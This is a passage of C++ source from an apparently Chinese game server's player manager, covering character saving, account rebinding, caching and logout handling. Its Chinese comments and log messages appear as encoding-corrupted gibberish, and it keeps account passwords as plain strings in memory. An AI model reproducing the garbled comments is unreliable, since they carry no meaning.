        rfalse(1, 0, "detected a overflowed data!");
        Globals::TraceMemory( &playerData, 0, sizeof(SFixProperty), "Overflow.mem" );
        return TRUE;
    }

	// �������������������Ľ�ɫ���ִ������⣨û�����֣�Ϊ�ո񣬻�Ƿ��ַ�������������棡
	if ( ( BYTE )playerData.m_Name[0] <= 32 )
	{
		TraceInfo( "special.log", "%s ������û�����ƵĽ�ɫ���������ݿⱣ���ɫ����ʱ��[sid=%d]",
			Globals::GetStringTime(), playerData.m_dwStaticID );
	}

    // ���߼���Ϊ�˸��½�ɫ���Ͱ��ɵĹ��������Ѿ�ת�������������
    //// ����ʱ����ӳ���!
    //if ( playerData.m_szTongName[0] == 0 )
    //    player_faction_map.erase( playerData.m_szName );
    //else
    //    player_faction_map[ playerData.m_szName ] = playerData.m_szTongName;

    // �޸ı����־����Ҫ����֪ͨ���ݿ��������ɫ״̬��
    SQSaveCharacterMsg msg;
    playerData.m_byStoreFlag = storeFlag;

    // ����ѹ������
    extern BOOL TryEncoding_NilBuffer( const void *src_data, size_t src_size, void *&dst_data, size_t &dst_size );

    // �����ض����°汾�ˣ�ֱ�ӷ���ѹ������
    LPVOID outData = NULL;
    size_t outSize = 0;
    BOOL result = TryEncoding_NilBuffer( &playerData, sizeof( SFixData ), outData, outSize );
	if (result && (outSize < sizeof(SFixData) - 32))
    {
        // ѹ���ɹ����ʺŵ����ݻ������´������
        LPDWORD dataBuf = ( LPDWORD )&msg.PlayerData;
        *dataBuf = ( DWORD )outSize;
        memcpy( &dataBuf[1], outData, *dataBuf );

        size_t accSize = strlen( account ) + 1;
        if ( accSize >= 128 )
            return rfalse( 4, 1, "�����쳣���ȵ��ʺţ������Ѿ�����Խ���ˣ�" ), FALSE;

        // �ʺŲ��ֶ��룬��4�ֽ�Ϊ��λ���д���
        size_t adSize = ( outSize >> 2 ) + 1;
        LPDWORD accountSize = &dataBuf[ 1 + adSize ];
        *accountSize = ( DWORD )accSize;
        memcpy( &accountSize[1], account, *accountSize );

        size_t segment = ( size_t )&( ( ( SQSaveCharacterMsg* )0 )->PlayerData );

        // ֻ������Ч���֣�
        msg.dwServerId = Globals::GetServerId();
        size_t sendSize = segment + 4 + ( adSize << 2 ) + 4 + accSize;
        if ( !Globals::SendToDBServer( &msg, sendSize ) )
            return FALSE;

        //Globals::UpdatePlayerScore( &playerData );

        return TRUE;
    }

    // ѹ��ʧ�ܺ󣬾�ֻ��ͨ���ɵ��߼������б����ˣ�
    rfalse( 4, 1, ( result ) ? "����ѹ�����С�������䣡" : "����ѹ������" );

    try
    {
        lite::Serializer slm( msg.streamData, sizeof( msg.streamData ) );
        slm( account );

        // ��������
		//��������msg.PlayerData = playerData;
        msg.dwServerId = Globals::GetServerId();
		int num = SectionMessageManager::getInstance().evaluateDevidedAmount(sizeof(msg)-slm.EndEdition());
		int id = 0;
		BOOL ret;
		for (int i = 0;i < num;i++)
		{
			SSectionMsg sMsg;
			id = SectionMessageManager::getInstance().devideMessage(i,num,&sMsg,&msg,sizeof(msg) - slm.EndEdition(),id);
			ret = Globals::SendToDBServer(&sMsg,sizeof(SSectionMsg));
			if(!ret)
			{
				return FALSE;
			}
		}
        //if ( !Globals::SendToDBServer( &msg, sizeof(msg) - slm.EndEdition() ) )
           // return FALSE;
    }
    catch ( lite::Xcpt & )
    {
        return FALSE;
    }

    //// �ɼ���ǰ��Ǯ(���������ݿ�)
    //m_DataCollect.AddTotalMoney( true, PlayerData.m_szName, (int)PlayerData.m_dwMoney+(int)PlayerData.m_dwStoreMoney );

    // ���ˢ�½�ɫ���а�
    //Globals::UpdatePlayerScore( &playerData );

    return TRUE;
}

BOOL CPlayerManager::RebindAccount(DNID dnidClient, LPCSTR szAccount, DWORD limitedState, LPCSTR idkey, DWORD online, DWORD offline)
{
    // ע�⣺�ú�������FALSE����Ϊ�˱������˺���Ҫ���������ݿ��������ݣ�������˵���°󶨺���ʧ��
    // ������Ϊ�������������������PutIntoRegionʧ�ܣ�����ٴε����ݿ������µ�����
    // ��һ�����ص������쳣���������ܵ��¸��ƣ�
    // scope
	
	{
		for (std::map<DNID, SLinkContextInfo>::iterator it = tempLinkContext.begin(); it != tempLinkContext.end(); ++it)
        {
            // �����ǰ�˺��Ѿ���ʹ��[������ͣ���ڽ�ɫѡ�����]����ֱ�ӷ���TRUE��RebindAccount�ɹ��򲻻��������ִ��
            if (it->second.account == szAccount)
                return TRUE;
        }
    }

	std::map<std::string, SPlayer>::iterator it = playerCache.find(szAccount);
    if (it == playerCache.end())
        return FALSE;
	//return TRUE; //��ʱȡ���ض���
    // ˵���ý�ɫ��������
    if (it->second.byIsRebinding)
    {
        // ���⴦����һ�����Ӵ��������ض����е��ߵĻ����ǿ�������������
        // �������ʱ��ͻ���û����Ϸ��ǰ�����ݣ�ͨ����m_bQuestFullData���ǵķ�����Ҫ��������������ͻ��˷��ͳ�ʼ������
        it->second.TempData.m_bQuestFullData = true;
    }

    // ���޸ĸý�ɫ�ı�������
    it->second.byIsLostLink		= true;
    it->second.byIsRebinding	= true;
    it->second.dwRebindSegTime	= timeGetTime();

    // �Ƿ��������ϵͳ��
	it->second.idkey = idkey ? idkey : "";

    // ����������²���Ҫ����Ŀ�곡�����������Ƿ���Ա
    SPlayer &player = it->second;

    // ������ϵͳ
    player.dwLoginSegment	= (DWORD)time(NULL);	// ��¼������Ϸ����ʱ��
    player.limitedState		= limitedState;
    player.offline			= offline;
    player.online			= online;

    sockaddr_in addr;
    ZeroMemory(&addr,sizeof(sockaddr_in));

    if (server.GetDnidAddr(dnidClient, &addr, sizeof(addr)))
        player.ip = inet_ntoa(addr.sin_addr);

    // ���ú�����ʵ��������˵�������Ƿ���볡��ʧ�ܣ����ս��һ������ΪTRUE
	// ���°�ʱ���볡��ʧ�ܣ�������������������������µģ�����Ϊ�ý�ɫ������Ȼ���ڣ����Բ���ͨ���ٴλ�ȡ���ݿ����ݵķ�ʽ������Ϸ
	// ������޷����볡�����ܵ��¿��ţ�����ʱ���������Ժ���취
	Globals::PutIntoRegion( dnidClient, player.account.c_str(), player.dwGlobalID, player.Data.m_CurRegionID, player.dwRegionServerKey);

    return TRUE;
}

BOOL CPlayerManager::AssignPlayer(DNID dnidClient, SFixData *data)
{
	std::map<DNID, SLinkContextInfo>::iterator itLink = tempLinkContext.find(dnidClient);
    if (itLink == tempLinkContext.end())
        return FALSE;

	// �����ʱ�ڵ�½���ݿ����Ѿ��������[�˺�]��ɫ�ˣ��򷵻�ʧ��
    std::map<std::string, SPlayer>::iterator itCheck = playerCache.find(itLink->second.account);
    if (itCheck != playerCache.end())
        return FALSE;

    SPlayer player;

	player.dwGlobalID			= Globals::GetGuid(true);
    player.dwRegionServerKey	= 0;
	player.byIsLostLink			= true;
    player.byIsRebinding		= true;

    player.fixData = *data;
    memset(&player.TempData, 0, sizeof(player.TempData));
	player.Data.m_Name[CONST_USERNAME-1] = 0;
	//player.Data.m_GMLevel	= itLink->second.gmlevel;
	dwt::strcpy(player.Data.m_UPassword, itLink->second.userpass.c_str(), sizeof(player.Data.m_UPassword));

	player.dwNextCheckTime		= timeGetTime();
	player.dwNextCheckExtra		= 0;

    // ������ϵͳ
    player.dwLoginSegment	= (DWORD)time(NULL);			// ��¼������Ϸ����ʱ��
    player.limitedState		= itLink->second.limitedState;
    player.offline			= itLink->second.offline;
    player.online			= itLink->second.online;
    player.puid				= itLink->second.puid;
	player.idkey			= itLink->second.idkey;			// �Ƿ��������ϵͳ��

    player.account = itLink->second.account;
    player.password = itLink->second.password;

    sockaddr_in addr;
    ZeroMemory(&addr,sizeof(sockaddr_in));

    if (server.GetDnidAddr(dnidClient, &addr, sizeof(addr)))
        player.ip = inet_ntoa(addr.sin_addr);

	if (!Globals::PutIntoRegion(dnidClient, player.account.c_str(), player.dwGlobalID, 5,/*player.Data.m_CurRegionID,*/ player.dwRegionServerKey))
    {
		// ����ط�˵����Ϣ�������д�
		if (-1 == player.dwRegionServerKey)
            return FALSE;

        // ��Ŀ�������뵽�ö���ĳ�����
        /*Globals::SBornPos *bornPos = Globals::GetBornPos(player.Data.m_School);
        if (!bornPos)
            return FALSE;

        player.Data.m_CurRegionID	= bornPos->wRegionID;
        player.Data.m_X				= (bornPos->wPosX << 5) + rand() % bornPos->wRadius;
        player.Data.m_Y				= (bornPos->wPosY << 5) + rand() % bornPos->wRadius;
		player.Data.m_dir			= 0;*/

		if (!Globals::PutIntoRegion(dnidClient, player.account.c_str(), player.dwGlobalID,  5, /*player.Data.m_CurRegionID,*/ player.dwRegionServerKey))
            return FALSE;
    }

	// ����ҽ�ɫ���뵽cache
	playerCache[player.account] = player;

    // ��LinkContextȥ��
    tempLinkContext.erase(dnidClient);

	m_onlineNumber++;	// ��ʱ�����Ϸ�е���������

    return TRUE;
}

BOOL CPlayerManager::RegisterContext(DNID dnid, LPCSTR account, LPCSTR password, LPCSTR userpass, DWORD limitedState, int gmlevel, LPCSTR idkey, DWORD online, DWORD offline, QWORD puid)
{
	if (gmlevel < 0 || gmlevel > 5)
        return FALSE;

	// ������������Ŀ�����2������ӵ������ͬ��dnid�����ⲻӦ�ã�
    if (tempLinkContext.find(dnid) != tempLinkContext.end())
        return FALSE;

	if (account == NULL && password == NULL && userpass == NULL)
        return tempLinkContext.erase(dnid) != 0;

    SLinkContextInfo &temp = tempLinkContext[dnid];
    temp.account		= account;
    temp.password		= password;
    temp.userpass		= userpass;
    temp.gmlevel		= gmlevel;
    temp.doUnbind		= false;
    temp.limitedState	= limitedState;
    temp.online			= online;
    temp.offline		= offline;
	temp.idkey			= idkey ? idkey : "";
    temp.puid			= puid;

    return TRUE;
}

BOOL CPlayerManager::UpdatePlayerData( struct SARefreshPlayerMsg *pMsg )
{
    LPCSTR account = NULL;
    try
    {
        lite::Serialreader sl( pMsg->streamData );
        account = sl();
    }
    catch ( lite::Xcpt & )
    {
        return FALSE;
    }

    std::map< std::string, SPlayer >::iterator it = playerCache.find( account );
    if ( it == playerCache.end() )
        return FALSE;

    SPlayer *pPlayer = &it->second;
   // if ( pPlayer == NULL || pPlayer->dwGlobalID != pMsg->gid ) 
   //     return FALSE;

    // �����������ɫ�����ݣ�����Ҫsave;
    if ( memcmp( account, "�ο�", 4 ) == 0 )
    {
        // ��Ϊ�ǡ��ο͡����Ժ����ı��涼������Ч��������Ҫ�����ݻ�������Ҫ���ڵ�
    }
    else if ( pMsg->storeflag != SARefreshPlayerMsg::ONLY_LOGOUT )
    {
		if (pMsg->fixData.m_dwStaticID == 0 || pMsg->fixData.m_dwStaticID > 0x80000000)
        {
            rfalse( 2, 1, "###""���������%sStaticID�д�", account );
            rfalse( 1, 1, "###""���������%sStaticID�д�", account );
            return false;
        }
    }

	BYTE prStoreFlag = pPlayer->Data.m_byStoreFlag;
    switch ( pMsg->storeflag )
    {
    case SARefreshPlayerMsg::ONLY_LOGOUT:
        // �˺��˳�
        PlayerLogout( account, pPlayer->password.c_str(), pPlayer );

        // ��ɫ���
        ClearPlayerInCache( account );
        break;

    case SARefreshPlayerMsg::ONLY_BACKUP:
        // ��������
		pPlayer->fixData = pMsg->fixData;
        break;

    case SARefreshPlayerMsg::BACKUP_AND_SAVE:
        // ��������
		pPlayer->fixData = pMsg->fixData;
		pPlayer->fixData = pMsg->fixData;

        // ��������
		SavePlayerData(account, pMsg->fixData, SFixProperty::ST_LOGIN);
        break;

    case SARefreshPlayerMsg::SAVE_AND_LOGOUT:
        // ��������
		pPlayer->fixData = pMsg->fixData;

        // �˺��˳�
        PlayerLogout( account, pPlayer->password.c_str(), pPlayer );

        // ��������
		if (SavePlayerData(account, pMsg->fixData, SFixProperty::ST_LOGOUT))
        {
            // ��ɫ���
            ClearPlayerInCache( account );
        }
        break;

    case SARefreshPlayerMsg::BACKUP_AND_FLAG:
        // ��������
		pPlayer->fixData = pMsg->fixData;
        pPlayer->TempData.m_IsRegionChange = FALSE;

        // ����߱�־
        pPlayer->byIsLostLink = true;

        // ����������°󶨱�־
        pPlayer->byIsRebinding = true;
        pPlayer->dwRebindSegTime = timeGetTime();
        pPlayer->Data.m_byStoreFlag = 0xff;
        break;

    case SARefreshPlayerMsg::SAVE_AND_HANGUP:
        // ����ͬBACKUP_AND_FLAG
		pPlayer->fixData = pMsg->fixData;
        pPlayer->TempData.m_IsRegionChange = FALSE;

        pPlayer->byIsLostLink = true;
        pPlayer->byIsRebinding = true;

        //��������ˢ��ʱ��
        pPlayer->dwNextCheckTime = timeGetTime();
        pPlayer->dwNextCheckExtra = timeGetTime() + REFRESHTIME_OFFLINEEXTRA;

        // ��Ϊ�ǹһ�����ɫ�ض�����Ϸ�У����Բ���Ҫ��ⳬʱ
        pPlayer->dwRebindSegTime = 0;

        BYTE pot = 0;

        // Ŀǰ��m_wScriptID���ж���û��������
//         if ( pPlayer->Data.m_wScriptID !=0 )
//             pot++;

//        if ( pPlayer->TempData.m_dwExtraState & SHOWEXTRASTATE_SALE )
//            pot++;

        // ֪ͨ�˺ŷ����������˺ſ�ʼ�һ�
        PlayerHangup( account, pPlayer->password.c_str(), pot, pPlayer );

		// ��������
		SavePlayerData(account, pMsg->fixData, SFixProperty::ST_HANGUP);
        pPlayer->Data.m_byStoreFlag = SFixProperty::ST_HANGUP;
        break;
    }

    return TRUE;
}

BOOL CPlayerManager::DoubleUpdatePlayerData( SDoubleSavePlayerMsg *pMsg )
{
	std::map< std::string, SPlayer >::iterator it1, it2;
	it1 = playerCache.find( pMsg->account[0] );
	if ( it1 == playerCache.end() )
		return rfalse( 2, 1, "ͬ������ʱ���˺�1[%s]������", pMsg->account[0] );
	assert( it1->second.dwGlobalID == pMsg->gid[0] );

	if ( pMsg->gid[1] != 0 )
	{
		it2 = playerCache.find( pMsg->account[1] );
		if ( it2 == playerCache.end() )
			return rfalse( 2, 1, "ͬ������ʱ���˺�2[%s]������", pMsg->account[1] );
		assert( it2->second.dwGlobalID == pMsg->gid[1] );
		//�������� it2->second.Data = pMsg->data[1];
	}

//��������	it1->second.Data = pMsg->data[0];
	return true;
}

LPCSTR CPlayerManager::GetAccountByDnid(DNID dnid)
{
    std::map<DNID, SLinkContextInfo>::iterator itLink = tempLinkContext.find(dnid);
    if ( itLink == tempLinkContext.end() )
        return NULL;

    return itLink->second.account.c_str();
}

LPCSTR CPlayerManager::GetUserPassByDnid( DNID dnid )
{
    std::map< DNID, SLinkContextInfo >::iterator itLink = tempLinkContext.find( dnid );
    if ( itLink == tempLinkContext.end() )
        return NULL;

    return itLink->second.userpass.c_str();
}

BOOL CPlayerManager::DoCheckRebind(DNID dnid, SQCheckRebindMsg *pMsg)
{
    SACheckRebindMsg msg;

    msg.dnidClient	= pMsg->dnidClient;
    msg.gid			= pMsg->gid;

    LPCSTR account = NULL;
    try
    {
        lite::Serialreader sl(pMsg->streamData);
        account = sl();
    }
    catch ( lite::Xcpt & )
    {
        return FALSE;
    }

	msg.dwResult = 1;

	SPlayer *pPlayer = NULL;
	std::map<std::string, SPlayer>::iterator it = playerCache.find(account);
    if (it == playerCache.end())
    {
        // ����Ҳ����������˵����֤ʧ��
        msg.dwResult = 0;
    }
    else
    {
        pPlayer = &it->second;

        if (pPlayer->dwGlobalID != pMsg->gid)
        {
            // �����ȫ��IDУ���������
            msg.dwResult = 0;
        }
        else
        {
			DWORD dwIP = 0, dwPort = 0;
            DNID  dnidDest = 0;
            
			if (!Globals::GetServerInfo(pPlayer->dwRegionServerKey, dnidDest, dwIP, dwPort))
            {
                // �Ҳ���Ŀ�곡��
                msg.dwResult = 0;
            }
        }

        if (msg.dwResult == 1 && pPlayer != NULL)
        {
			// �󶨳ɹ�
            pPlayer->byIsLostLink = false;
            pPlayer->byIsRebinding = false;

            if (pPlayer->dwNextCheckExtra != 0)
            {
                pPlayer->dwNextCheckTime	= timeGetTime();
                pPlayer->dwNextCheckExtra	= 0;
                pPlayer->dwRebindSegTime	= 0;
            }
        }
    }

    try
    {
        lite::Serializer slm(msg.streamData, sizeof(msg.streamData));
        slm(account);

        if (msg.dwResult == 1 && pPlayer != NULL && pPlayer->limitedState)
            slm[0](pPlayer->online)(pPlayer->offline);

        if (pPlayer && (pPlayer->puid != 0))
            slm[1](pPlayer->puid);

        if (!Globals::SendToGameServer(dnid, &msg, sizeof(msg) - slm.EndEdition()))
            rfalse(1, 1, "send SACheckRebindMsg fail!!!");

		//�������°���ɣ����������Ӧ�ÿ��������������,�����¼��������������������
// 		if (pPlayer)
// 		{
// 			g_dConcurrencyPlayerNum++;
// 			g_dConcurrencyAllPlayerNum++;
// 			playerloginlist[pPlayer->account] = GetTickCount();
// 		}
		
    }
    catch (lite::Xcpt &)
    {
        return FALSE;
    }

    return (msg.dwResult == 1);
}

BOOL CPlayerManager::AccountExist( LPCSTR account )
{
    return ( playerCache.find( account ) != playerCache.end() );
}

BOOL CPlayerManager::GetPlayerData(LPCSTR account, DWORD gid, SFixData *data, SPlayerTempData *tdata)
{
    std::map< std::string, SPlayer >::iterator it = playerCache.find( account );
    if ( it == playerCache.end() )
        return FALSE;

    if ( gid != it->second.dwGlobalID )
        return FALSE;

    *data = it->second.fixData;
    *tdata = it->second.TempData;

    return TRUE;
}

BOOL CPlayerManager::ClearPlayerInCache( LPCSTR account )
{
    if ( playerCache.erase( account ) )
    {
        // ͬʱҲ��Ҫ֪ͨ���ݿ����������������ݽ��������ID��

        // ���ٷ���ȡ������Ϣ�������ȡ���ᵼ����������޷����棡
        // �����ڵ���ClearPlayerInCacheǰ���Ѿ������ݿ���������������ı���������
        // QueryPlayerList( account, NULL, 0 );
        return TRUE;
    }

    return FALSE;
}

BOOL CPlayerManager::GetDnidContext( DNID dnid, LPCSTR &account, LPCSTR &password, LPCSTR &userpass )
{
    std::map< DNID, SLinkContextInfo >::iterator itLink = tempLinkContext.find( dnid );
    if ( itLink == tempLinkContext.end() )
        return FALSE;

    account = itLink->second.account.c_str();
    password = itLink->second.password.c_str();
    userpass = itLink->second.userpass.c_str();

    return TRUE;
}

BOOL CPlayerManager::SetPlayerServerKey( LPCSTR account, DWORD ID )
{
    SPlayer *p = FindPlayer( account );
    if ( p == NULL )
        return FALSE;

    p->dwRegionServerKey = ID;
    return TRUE;
}

BOOL CPlayerManager::ActivateLinkContextWithRebind( DNID dnid )
{
    std::map< DNID, SLinkContextInfo >::iterator itLink = tempLinkContext.find( dnid );
    if ( itLink == tempLinkContext.end() )
        return FALSE;

    itLink->second.doUnbind = true;

    return TRUE;
}

void CPlayerManager::DisplayInfo()
{
    int count = 0;
    for ( std::map< std::string, SPlayer >::iterator it = playerCache.begin(); it != playerCache.end(); it ++ )
    {
        if ( it->first.length() < 4 )
            continue;

        if ( memcmp( it->first.c_str(), "�ο�", 4 ) != 0 )
            continue;

        count ++;
    }

    rfalse( 2, 1, "��ǰ�����е�����/�ο���/ͣ���ڽ�ɫѡ���������� �� %d/%d/%d",
        playerCache.size(), count, tempLinkContext.size() );
}

BOOL CPlayerManager::SavePlayerConfig( struct SQSavePlayerConfigInfo *pMsg )
{
// 	SQLSavePlayerConfig psavemsg;
// 	psavemsg.serverId = Globals::GetServerId();
// 	dwt::strcpy(psavemsg.streamData,pMsg->streamData,MAX_ACCOUNT);
// 	dwt::strcpy(psavemsg.playerconfig,pMsg->playerconfig,1024);

	std::vector<SCplayerConfig>::iterator ite = playercon.begin();
	while(ite != playercon.end())
	{
		SCplayerConfig CplayerConfig = *ite;
		if (dwt::strcmp(CplayerConfig.straccount.c_str(),pMsg->streamData,MAX_ACCOUNT) == 0){
			return FALSE;
		}
		ite++;
	}
	SCplayerConfig CplayerCon;
	CplayerCon.straccount = pMsg->streamData;
	CplayerCon.strconfig = pMsg->playerconfig;
//	dwt::strcpy(CplayerCon.straccount,pMsg->streamData,MAX_ACCOUNT);
	//dwt::strcpy(CplayerCon.strconfig,pMsg->playerconfig,1024);
	playercon.push_back(CplayerCon);
	return TRUE;
/*	return Globals::SendToDBServer(&psavemsg,sizeof(SQLSavePlayerConfig));*/
	
}

BOOL CPlayerManager::SavePlayerConfig( LPCSTR szAccount, LPCSTR szconfig )
{
	SQSavePlayerConfigInfo PlayerConfigmsg;
	dwt::strcpy(PlayerConfigmsg.streamData,szAccount,MAX_ACCOUNT);
	dwt::strcpy(PlayerConfigmsg.playerconfig,szconfig,1024);
	return SavePlayerConfig(&PlayerConfigmsg);
}

BOOL CPlayerManager::SendPlayerConfig( LPCSTR szAccount )
{
	std::vector<SCplayerConfig>::iterator ite = playercon.begin();
	while(ite != playercon.end())
	{
		SCplayerConfig CplayerConfig = *ite;
		if (dwt::strcmp(CplayerConfig.straccount.c_str(),szAccount,MAX_ACCOUNT) == 0)
		{
			 SQLSavePlayerConfig psavemsg;
		     psavemsg.serverId = Globals::GetServerId();
			 dwt::strcpy(psavemsg.streamData,CplayerConfig.straccount.c_str(),MAX_ACCOUNT);
			 dwt::strcpy(psavemsg.playerconfig,CplayerConfig.strconfig.c_str(),1024);
			 return Globals::SendToDBServer(&psavemsg,sizeof(SQLSavePlayerConfig));
		}
		ite++;
	}
	return FALSE;
}

BOOL CPlayerManager::CleanPlayerConfig( LPCSTR szAccount )
{
	std::vector<SCplayerConfig>::iterator ite = playercon.begin();
	while(ite != playercon.end())
	{
		SCplayerConfig CplayerConfig = *ite;
		if (dwt::strcmp(CplayerConfig.straccount.c_str(),szAccount,MAX_ACCOUNT) == 0)
		{
			playercon.erase(ite);
			return TRUE;
		}
		ite++;
	}
	return FALSE;
}
